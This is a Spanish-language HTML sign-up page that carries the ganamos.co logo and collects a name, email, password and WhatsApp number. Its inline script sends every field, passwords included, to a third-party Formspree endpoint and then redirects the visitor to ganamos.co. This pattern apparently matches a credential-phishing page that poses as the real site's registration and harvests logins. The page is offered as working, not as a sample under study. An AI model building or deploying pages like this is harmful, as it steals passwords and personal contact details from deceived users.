<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario Adaptado</title>
    <link rel="stylesheet" href="styles.css"> <!-- Enlace al CSS externo -->
    <script>
        function handleSubmit(event) {
            event.preventDefault(); // Prevenir el envío normal del formulario
            
            var form = event.target;
            var formData = new FormData(form);
            
            // Enviar datos usando fetch
            fetch('https://formspree.io/f/xdkoodgo', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(function(response) {
                if (response.ok) {
                    setTimeout(function() {
                        window.location.href = 'https://ganamos.co'; // Redirigir después del envío exitoso
                    }, 1000);
                } else {
                    alert("Hubo un error al enviar el formulario. Inténtalo de nuevo.");
                }
            }).catch(function(error) {
                alert("Hubo un problema con el envío. Verifica tu conexión e inténtalo nuevamente.");
            });
        }
    </script>
</head>
<body>
    <div class="container">
        <form onsubmit="handleSubmit(event);" method="POST">
            <img src="https://ganamos.co/public/img/logo.png" alt="Logo" class="logo">
            
            <label for="name">Nombre:</label>
            <input type="text" id="name" name="name" required>

            <label for="email">Correo Electrónico:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>

            <label for="number">Número de WhatsApp:</label>
            <input type="number" id="number" name="number" required>

            <button type="submit">Registrarse</button>
        </form>
    </div>
</body>
</html>
